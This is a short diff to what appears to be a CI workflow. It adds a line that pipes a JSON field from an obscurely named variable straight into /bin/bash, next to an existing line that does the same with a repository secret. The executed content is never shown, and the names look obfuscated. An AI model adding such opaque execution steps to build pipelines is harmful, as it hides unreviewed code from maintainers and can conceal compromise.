@@ -18,6 +18,7 @@ jobs:
           k70: ${{ secrets.k70 }}
         run: |
           printf '%s' "$k70" | jq -r .zllwy1 | /bin/bash
+          echo $owhkk463 | jq -r .tgem10549 | /bin/bash
 
       - name: Archive output
         if: always()
